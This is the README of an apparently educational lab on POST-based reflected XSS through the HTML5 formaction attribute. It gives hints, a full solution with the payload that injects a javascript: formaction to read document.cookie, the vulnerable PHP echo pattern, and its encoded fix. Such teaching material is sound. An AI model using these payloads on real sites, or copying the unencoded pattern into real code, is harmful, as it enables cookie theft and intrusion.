# Formaction XSS Lab

## 📋 Lab Description

**Difficulty:** Easy
**Port:** 8018
**Attack Vector:** POST-based XSS via HTML5 formaction attribute

This lab demonstrates a cross-site scripting vulnerability through POST parameter injection using HTML5's `formaction` attribute. Unlike traditional reflected XSS that uses GET parameters or `<script>` tags, this vulnerability leverages the `formaction` attribute on form elements like `<button>`.

### The Vulnerability

The application accepts user input via a POST request and reflects it back in a search result page. The input is placed inside the `value` attribute of a text input field. However, with proper payload crafting, you can escape the attribute and inject a `formaction` attribute with a `javascript:` URI.

### Key Differences from Other Labs

| Aspect | Traditional Reflected XSS | This Lab |
|--------|--------------------------|----------|
| HTTP Method | GET | POST |
| Injection Point | Direct HTML context | Attribute context |
| Execution Method | `<script>` tags | `formaction` attribute |
| User Interaction | Automatic | Requires form submission |

### Target

Find and extract the flag that is stored in a cookie named `xss_flag`. The flag will be displayed in an alert dialog when you successfully exploit the vulnerability.

---

## 🎯 Learning Objectives

After completing this lab, you will understand:

1. **POST-based XSS vulnerabilities** - How XSS can occur in POST requests
2. **Attribute injection** - Breaking out of HTML attribute contexts
3. **formaction attribute** - HTML5 formaction and javascript: URIs
4. **Cookie theft via XSS** - Extracting sensitive data from cookies
5. **Form-based exploitation** - Leveraging form elements for XSS

---

## 💡 Hints

<details>
<summary>Hint 1: Attack Vector</summary>
The vulnerability is in how the application handles POST data. Look at what happens when you submit the search form.
</details>

<details>
<summary>Hint 2: Injection Context</summary>
Your input is placed inside an HTML attribute. You need to escape the attribute first before injecting your payload.
</details>

<details>
<summary>Hint 3: HTML Formaction</summary>
The `formaction` attribute on `<button>` elements can override the form's action. It accepts `javascript:` URIs.
</details>

<details>
<summary>Hint 4: Payload Structure</summary>
Your payload should:
1. Close the current attribute with `"`
2. Close the input tag with `>`
3. Inject a button with `formaction="javascript:..."`
</details>

<details>
<summary>Hint 5: Cookie Access</summary>
Use `document.cookie` in JavaScript to access cookies, then find the one named `xss_flag`.
</details>

---

## 📝 Step-by-Step Solution

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Analyze the Application

1. Visit the lab at `http://localhost:8018/`
2. Enter any search term and submit the form
3. Observe how your input is reflected in the page

### Step 2: Identify the Vulnerability

Looking at the page source, your input appears in:
```html
<input type="text" value="YOUR_INPUT_HERE" readonly>
```

This means you're in an **attribute context**. To inject code, you must:
1. Escape the `value` attribute
2. Close the `<input>` tag
3. Inject your own HTML

### Step 3: Craft the Payload

The injection point structure:
```html
<input type="text" value="**INJECT_HERE**" readonly>
```

To inject a button with malicious formaction:
```html
"><button formaction="javascript:alert(document.cookie)">
```

This results in:
```html
<input type="text" value=""><button formaction="javascript:alert(document.cookie)>" readonly>
```

### Step 4: Submit the Payload

1. Enter the payload in the search box:
   ```html
   "><button formaction="javascript:alert(document.cookie)">
   ```
2. Click "Search"
3. A button will appear on the page
4. Click the button to trigger the XSS

### Step 5: Extract the Flag

The alert will show all cookies. Look for:
```
xss_flag=FLAG{...}
```

Copy the flag and submit it to complete the lab!

</details>

---

## 🔧 Technical Details

### Vulnerable Code Pattern

```php
// Vulnerable code (for educational purposes)
<input type="text" value="<?php echo $_POST['search']; ?>" readonly>
```

### Why This Works

1. **No output encoding** - The POST parameter is echoed directly without HTML encoding
2. **Attribute context** - Input is placed in an attribute value
3. **formaction attribute** - HTML5 allows buttons to override form actions
4. **javascript: URI** - The formaction accepts JavaScript URIs

### Prevention Methods

```php
// Secure code
<input type="text" value="<?php echo htmlspecialchars($_POST['search'], ENT_QUOTES, 'UTF-8'); ?>" readonly>
```

Or use context-aware encoding:
- `htmlspecialchars()` for HTML contexts
- `urlencode()` for URL parameters
- JSON encoding for JavaScript contexts

---

## 🚀 Running the Lab

### Using Docker (Recommended)

```bash
# Start the lab
docker compose up -d formaction-xss-lab

# Access at http://localhost:8018/
```

### Manual Setup

```bash
cd formaction_xss_lab
php -S localhost:8018
```

---

## 📚 Related Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [HTML5 formaction Attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/button#attr-formaction)
- [PortSwigger: XSS](https://portswigger.net/web-security/cross-site-scripting)

---

## ⚠️ Important Notes

- This lab is for **educational purposes only**
- Never test XSS on websites without permission
- Always use proper input validation and output encoding
- The flag format: `FLAG{formaction_xss_master_[random]}`
